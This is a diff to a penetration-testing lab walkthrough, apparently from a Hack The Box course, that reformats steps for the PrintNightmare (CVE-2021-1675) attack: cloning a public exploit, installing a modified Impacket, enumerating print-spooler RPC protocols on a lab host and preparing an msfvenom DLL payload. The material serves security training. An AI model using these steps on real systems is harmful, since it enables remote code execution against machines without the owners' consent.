@@ -10,19 +10,22 @@ Before conducting this attack, we must retrieve the exploit we will use. In this
   git clone https://github.com/cube0x0/CVE-2021-1675.git
   ```
 
-For this exploit to work successfully, we will need to use cube0x0's version of Impacket. We may need to uninstall the version of Impacket on our attack host and install cube0x0's (this is already installed on ATTACK01 in the lab). We can use the commands below to accomplish this:
+For this exploit to work successfully, we will need to use cube0x0's version of Impacket. We may need to uninstall the version of Impacket on our attack host and install cube0x0's . We can use the commands below to accomplish this:
 
 #### Install cube0x0's Version of Impacket
 
         shellsession
-`pip3 uninstall impacket git clone https://github.com/cube0x0/impacket cd impacket python3 ./setup.py install`
+```
+pip3 uninstall impacket git clone https://github.com/cube0x0/impacket cd impacket python3 ./setup.py install
+```
 
 We can use `rpcdump.py` to see if `Print System Asynchronous Protocol` and `Print System Remote Protocol` are exposed on the target.
 
 #### Enumerating for MS-RPRN
 
         shellsession
-`0xxNosystemisSafe@htb[/htb]$ rpcdump.py @172.16.5.5 | egrep 'MS-RPRN|MS-PAR' Protocol: [MS-PAR]: Print System Asynchronous Remote Protocol  Protocol: [MS-RPRN]: Print System Remote Protocol`
+```
+0xxNosystemisSafe@htb[/htb]$ rpcdump.py @172.16.5.5 | egrep 'MS-RPRN|MS-PAR' Protocol: [MS-PAR]: Print System Asynchronous Remote Protocol  Protocol: [MS-RPRN]: Print System Remote Protocol`
 
 After confirming this, we can proceed with attempting to use the exploit. We can begin by crafting a DLL payload using `msfvenom`.
 
